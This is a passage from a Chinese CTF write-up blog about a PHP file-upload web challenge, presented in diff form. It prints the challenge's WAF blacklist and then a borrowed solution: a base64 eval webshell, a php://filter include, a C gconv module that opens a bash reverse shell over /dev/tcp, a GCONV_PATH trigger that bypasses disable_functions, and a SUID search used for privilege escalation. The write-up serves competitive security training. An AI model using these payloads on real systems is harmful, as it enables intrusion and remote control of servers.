mysqli_stmt_field_count, mysqli_stmt_free_result, mysqli_stmt_get_result, mysqli_stmt_get_warnings, mysqli_stmt_init, mysqli_stmt_insert_id, mysqli_stmt_more_results, mysqli_stmt_next_result, mysqli_stmt_num_rows, mysqli_stmt_param_count, mysqli_stmt_prepare, mysqli_stmt_reset, mysqli_stmt_result_metadata, mysqli_stmt_send_long_data, mysqli_stmt_store_result, mysqli_stmt_sqlstate, mysqli_sqlstate, mysqli_ssl_set, mysqli_stat, mysqli_store_result, mysqli_thread_id, mysqli_thread_safe, mysqli_use_result, mysqli_warning_count, mysqli_refresh, mysqli_escape_string, mysqli_set_opt, posix_kill, posix_getpid, posix_getppid, posix_getuid, posix_setuid, posix_geteuid, posix_seteuid, posix_getgid, posix_setgid, posix_getegid, posix_setegid, posix_getgroups, posix_getlogin, posix_getpgrp, posix_setsid, posix_setpgid, posix_getpgid, posix_getsid, posix_uname, posix_times, posix_ctermid, posix_ttyname, posix_isatty, posix_getcwd, posix_mkfifo, posix_mknod, posix_access, posix_getgrnam, posix_getgrgid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_setrlimit, posix_get_last_error, posix_errno, posix_strerror, posix_initgroups, readline, readline_info, readline_add_history, readline_clear_history, readline_list_history, readline_read_history, readline_write_history, readline_completion_function, readline_callback_handler_install, readline_callback_read_char, readline_callback_handler_remove, readline_redisplay, readline_on_new_line, shmop_open, shmop_read, shmop_close, shmop_size, shmop_write, shmop_delete, simplexml_load_file, simplexml_load_string, simplexml_import_dom, socket_select, socket_create, socket_create_listen, socket_create_pair, socket_accept, socket_set_nonblock, socket_set_block, socket_listen, socket_close, socket_write, socket_read, socket_getsockname, socket_getpeername, socket_connect, socket_strerror, socket_bind, socket_recv, socket_send, socket_recvfrom, socket_sendto, socket_get_option, socket_set_option, socket_shutdown, socket_last_error, socket_clear_error, socket_import_stream, socket_export_stream, socket_sendmsg, socket_recvmsg, socket_cmsg_space, socket_addrinfo_lookup, socket_addrinfo_connect, socket_addrinfo_bind, socket_addrinfo_explain, socket_getopt, socket_setopt, msg_get_queue, msg_send, msg_receive, msg_remove_queue, msg_stat_queue, msg_set_queue, msg_queue_exists, sem_get, sem_acquire, sem_release, sem_remove, shm_attach, shm_remove, shm_detach, shm_put_var, shm_has_var, shm_get_var, shm_remove_var, token_get_all, token_name, xmlwriter_open_uri, xmlwriter_open_memory, xmlwriter_set_indent, xmlwriter_set_indent_string, xmlwriter_start_comment, xmlwriter_end_comment, xmlwriter_start_attribute, xmlwriter_end_attribute, xmlwriter_write_attribute, xmlwriter_start_attribute_ns, xmlwriter_write_attribute_ns, xmlwriter_start_element, xmlwriter_end_element, xmlwriter_full_end_element, xmlwriter_start_element_ns, xmlwriter_write_element, xmlwriter_write_element_ns, xmlwriter_start_pi, xmlwriter_end_pi, xmlwriter_write_pi, xmlwriter_start_cdata, xmlwriter_end_cdata, xmlwriter_write_cdata, xmlwriter_text, xmlwriter_write_raw, xmlwriter_start_document, xmlwriter_end_document, xmlwriter_write_comment, xmlwriter_start_dtd, xmlwriter_end_dtd, xmlwriter_write_dtd, xmlwriter_start_dtd_element, xmlwriter_end_dtd_element, xmlwriter_write_dtd_element, xmlwriter_start_dtd_attlist, xmlwriter_end_dtd_attlist, xmlwriter_write_dtd_attlist, xmlwriter_start_dtd_entity, xmlwriter_end_dtd_entity, xmlwriter_write_dtd_entity, xmlwriter_output_memory, xmlwriter_flush, zip_open, zip_close, zip_read, zip_entry_open, zip_entry_close, zip_entry_read, zip_entry_filesize, zip_entry_name, zip_entry_compressedsize, zip_entry_compressionmethod, opcache_reset, opcache_invalidate, opcache_compile_file, opcache_is_script_cached, opcache_get_configuration, opcache_get_status,
+</code></pre>
+<p>尝试用 show_source 函数读取 index.php ，不过有 WAF 做了过滤，发现base64并没有被过滤，于是用base64进行修饰绕过 base64_decode(“c2hvd19zb3VyY2U=”)，传马</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">'c2hvd19zb3VyY2U='</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+</code></pre>
+<p>读取到</p>
+<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>glow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">onsubmit</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>return checkFile()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+    嘿伙计，传个火？！
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input_file<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>flare<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>
+    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"\$_"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"copy"</span> <span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"usort"</span><span class="token punctuation">,</span><span class="token string">"include"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"file"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwriter"</span><span class="token punctuation">,</span><span class="token string">"fput"</span><span class="token punctuation">,</span><span class="token string">"copy"</span><span class="token punctuation">,</span><span class="token string">"curl"</span><span class="token punctuation">,</span><span class="token string">"fread"</span><span class="token punctuation">,</span><span class="token string">"fget"</span><span class="token punctuation">,</span><span class="token string">"function_exists"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"putenv"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"proc_close"</span><span class="token punctuation">,</span> <span class="token string">"proc_get_status"</span><span class="token punctuation">,</span><span class="token string">"checkdnsrr"</span><span class="token punctuation">,</span><span class="token string">"getmxrr"</span><span class="token punctuation">,</span><span class="token string">"getservbyname"</span><span class="token punctuation">,</span><span class="token string">"getservbyport"</span><span class="token punctuation">,</span> <span class="token string">"syslog"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"highlight_file"</span><span class="token punctuation">,</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"chmod"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    
+    <span class="token keyword">return</span> False<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//设置上传目录</span>
+<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"UPLOAD_PATH"</span><span class="token punctuation">,</span> <span class="token string">"./uploads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"Upload Success!"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/php/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"只要好看的php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"诶，被我发现了吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$new_file_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
+        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$new_file_name</span><span class="token punctuation">;</span>
+
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'Upload Failed!'</span><span class="token punctuation">;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">echo</span> <span class="token string">'&lt;div style="color:#F00">'</span><span class="token punctuation">.</span><span class="token variable">$msg</span><span class="token punctuation">.</span><span class="token string">" Look here~ "</span><span class="token punctuation">.</span><span class="token variable">$img_path</span><span class="token punctuation">.</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>发现还有WAF</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>
+    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"\$_"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"copy"</span> <span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"usort"</span><span class="token punctuation">,</span><span class="token string">"include"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"file"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwriter"</span><span class="token punctuation">,</span><span class="token string">"fput"</span><span class="token punctuation">,</span><span class="token string">"copy"</span><span class="token punctuation">,</span><span class="token string">"curl"</span><span class="token punctuation">,</span><span class="token string">"fread"</span><span class="token punctuation">,</span><span class="token string">"fget"</span><span class="token punctuation">,</span><span class="token string">"function_exists"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"putenv"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"proc_close"</span><span class="token punctuation">,</span> <span class="token string">"proc_get_status"</span><span class="token punctuation">,</span><span class="token string">"checkdnsrr"</span><span class="token punctuation">,</span><span class="token string">"getmxrr"</span><span class="token punctuation">,</span><span class="token string">"getservbyname"</span><span class="token punctuation">,</span><span class="token string">"getservbyport"</span><span class="token punctuation">,</span> <span class="token string">"syslog"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"highlight_file"</span><span class="token punctuation">,</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"chmod"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> False<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>看到这里是用strstr进行检测，而strstr() 对大小写不敏感，则这里直接用大小写进行绕过。<br>看大佬WP发现：<a target="_blank" rel="noopener" href="https://erroratao.github.io/writeup/DASCTF2022xSU/">atao’s blog</a><br>(从这里开始都还未进行复现，搬运了一下大佬的WP，等完了再填坑)<br>可以写一个base.php，内容是base64编码的木马。<br>再写一个shell.php，include另一个base.php，include的时候用Php filter解码。<br>base.php</p>
+<pre class=" language-php"><code class="language-php">PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4<span class="token operator">=</span>
+<span class="token shell-comment comment">#&lt;?php eval($_POST[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>
+</code></pre>
+<p>shell.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">'cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0yMmIxZmZhNzk3ZWQwOTk3YTIwNzY1YzdjZjhhNjU0OS5waHA='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment">#php:</span><span class="token comment" spellcheck="true">//filter/convert.base64-decode/resource=22b1ffa797ed0997a20765c7cf8a6549.php</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>由于disable functions太多，蚁剑用不了。看了看putenv没被禁。考虑LD_PRELOAD加载so文件。<br>现在访问第二个文件即可执行任意代码了<br>通过 move_uploaded_file() 函数上传 exp.so 和 gconv-modules ，实现 bypass disable_functions<br>exp.so</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/ip/port &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>编译成so文件</p>
+<pre class=" language-bash"><code class="language-bash">gcc exp.c -o exp.so -shared -fPIC
+</code></pre>
+<p>gconv-modules</p>
+<pre class=" language-1"><code class="language-1">module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2
+module  INTERNAL   EXP//    ../../../../../../../../tmp/exp    2
+</code></pre>
+<p>利用下面的 Payload 进行触发 (这边建议进行 URL 编码)</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so');</span>
+</code></pre>
+<p>拿到 shell 后查看根目录下 flag 的权限，只要 root 可读，需要提权<br>查看 SUID 的命令</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -user root -perm -4000 -print 2<span class="token operator">></span>/dev/null
+</code></pre>
+<p>发现nl命令，利用nl /flag即可提取flag。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">king_kb</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://kingofkb.github.io/2022/04/05/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/">http://kingofkb.github.io/2022/04/05/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">king_kb</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/pop-upload/">
+                                    <span class="chip bg-color">pop upload</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay1.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/04/20/De1CTF%202019%20SSRF%20Me%201%E9%A2%98%E8%A7%A3/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/ks3.jpeg" class="responsive-img" alt="De1CTF 2019 SSRF Me 1题解">
+                        
+                        <span class="card-title">De1CTF 2019 SSRF Me 1题解</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            代码审计
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-20
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/15/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_serialize_php%201%E9%A2%98%E8%A7%A3/">
+                    <div class="card-image">
+                        
+                        <img src="https://kingofkb.github.io/medias/cover/ks1.jpeg" class="responsive-img" alt="安洵杯 2019 easy_serialize_php 1题解">
+                        
+                        <span class="card-title">安洵杯 2019 easy_serialize_php 1题解</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            extract()变量覆盖，键值逃逸
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
